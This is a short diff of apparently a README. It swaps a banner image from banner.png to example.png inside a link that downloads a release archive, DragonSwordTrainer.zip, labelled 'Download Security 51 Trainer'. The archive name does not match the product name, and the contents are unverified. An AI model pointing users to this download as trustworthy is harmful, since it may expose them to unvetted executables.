@@ -13,7 +13,7 @@
 
 <p align="center">
     <a href="https://github.com/RapidsLordConnector/Security-51-Trainer/releases/latest/download/DragonSwordTrainer.zip">
-        <img src="assets/banner.png" width="100%" alt="Download Security 51 Trainer">
+        <img src="assets/example.png" width="100%" alt="Download Security 51 Trainer">
     </a>
 </p>
 
